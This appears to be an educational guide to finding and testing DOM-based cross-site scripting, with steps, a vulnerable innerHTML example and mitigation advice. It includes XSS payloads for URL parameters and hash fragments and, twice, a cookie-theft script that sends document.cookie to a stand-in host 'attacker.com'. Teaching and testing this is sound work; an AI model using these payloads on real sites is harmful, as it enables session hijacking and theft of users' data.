
# DOM-based Cross-Site Scripting (XSS) Guide
**DOM-Based XSS** happens when client-side scripts use data from the DOM (such as URL parameters, cookies, or form inputs) in an unsafe way, allowing an attacker to inject and execute malicious scripts. This type of XSS exploits weaknesses in the client-side code and is particularly tricky because it doesn’t rely on the server’s response.

### Steps to Perform DOM-Based XSS

Here’s a detailed breakdown of how an attacker might exploit a DOM-based XSS vulnerability:

#### 1. **Identify Potential Injection Points**

1. **Examine Client-Side Code**: Look for places where JavaScript reads data from the DOM or URL and processes it. This includes:
   - **JavaScript Variables**: Check for scripts that extract data from `window.location`, `document.cookie`, or form inputs.
   - **Event Handlers**: Inspect how event handlers process data from URL parameters or user inputs.
   - **JavaScript Functions**: Analyze functions that manipulate the DOM or use user input to update the page content.

2. **Analyze URL Parameters**: Check if URL parameters are used in the client-side code. Common patterns include:
   - **`window.location`**: Accessing query parameters or fragments.
   - **`document.URL`**: Reading the URL and using parts of it in scripts.
   - **`document.location.hash`**: Using hash fragments from the URL.

3. **Inspect Form Inputs**: Look at how form inputs or other user-provided data are handled by JavaScript. For example:
   - **User Input in DOM Manipulations**: Scripts that directly insert user input into the DOM without proper validation.

#### 2. **Test for Basic XSS Vulnerabilities**

1. **Inject Payloads in URL Parameters**: Test if inserting a script into URL parameters results in execution. For example, if the URL is `http://example.com/page?input=value`, try:
   ```
   http://example.com/page?input=<script>alert('XSS')</script>
   ```

2. **Manipulate Hash Fragments**: If the site uses URL hash fragments, try:
   ```
   http://example.com/page#<script>alert('XSS')</script>
   ```

3. **Test Form Inputs**: Submit payloads in forms to see if the input is used in DOM manipulations:
   ```html
   <script>alert('XSS')</script>
   ```

4. **Check JavaScript Event Handlers**: Look for XSS vulnerabilities in event handlers that use user input:
   ```html
   <button onclick="alert('XSS')">Click Me</button>
   ```

#### 3. **Confirm DOM-Based XSS**

1. **Verify Execution**: Ensure that the injected payload is executed when the page is loaded or when the user interacts with the page. For example, check if an alert pops up or if other malicious effects occur.

2. **Test Across Browsers**: Verify that the XSS vulnerability is consistent across different browsers and devices if applicable.

#### 4. **Extract Data (if applicable)**

1. **Use Data Theft Payloads**: Inject payloads that capture data from the user’s environment, such as cookies or session tokens. For example:
   ```html
   <script>
   fetch('http://attacker.com/steal?cookie=' + document.cookie);
   </script>
   ```

2. **Monitor Stolen Data**: Use a server or tool to collect and analyze the stolen data.

#### 5. **Exploit and Assess Impact**

1. **Test Broader Impacts**: Evaluate how the XSS vulnerability can be exploited:
   - **Session Hijacking**: Stealing cookies or session data.
   - **Phishing**: Creating fake forms or dialogs to capture sensitive information.
   - **Defacement**: Modifying the content or layout of the page.

2. **Document Findings**: Record the details of the vulnerability, including:
   - **Injection Points**: URL parameters, form fields, or other DOM manipulation sources.
   - **Payloads Used**: Scripts or payloads that were effective.
   - **Impact**: The potential harm caused by the vulnerability.

3. **Prepare Recommendations**: Provide advice on mitigating DOM-Based XSS vulnerabilities:
   - **Input Validation**: Validate and sanitize user input before using it in the DOM.
   - **Output Encoding**: Properly encode data before inserting it into the DOM.
   - **Use Safe APIs**: Utilize safer methods for DOM manipulation, such as `textContent` instead of `innerHTML` for user-supplied data.

### Example Scenario: Testing a URL Parameter

1. **Identify Injection Point**: Suppose there is a page that reads and displays URL parameters. For example:
   ```javascript
   var input = new URLSearchParams(window.location.search).get('input');
   document.getElementById('output').innerHTML = input;
   ```

2. **Test for Basic XSS**: Modify the URL to include a payload:
   ```
   http://example.com/page?input=<script>alert('XSS')</script>
   ```

3. **Confirm DOM-Based XSS**: Check if the script executes when the page is loaded.

4. **Use Data Theft Payloads**: If needed, try capturing data:
   ```html
   <script>
   fetch('http://attacker.com/steal?cookie=' + document.cookie);
   </script>
   ```

5. **Document Findings**: Note the URL parameter used, the payload, and the effects observed.

### Conclusion

DOM-Based XSS vulnerabilities involve client-side scripts that allow an attacker to inject and execute malicious scripts by manipulating the DOM with untrusted data. Identifying these vulnerabilities requires analyzing how client-side code handles user inputs and URL parameters. Proper input validation, output encoding, and safe DOM manipulation practices are essential for mitigating DOM-Based XSS vulnerabilities.

Always ensure you have explicit permission to test for XSS vulnerabilities and adhere to ethical guidelines during your assessments.
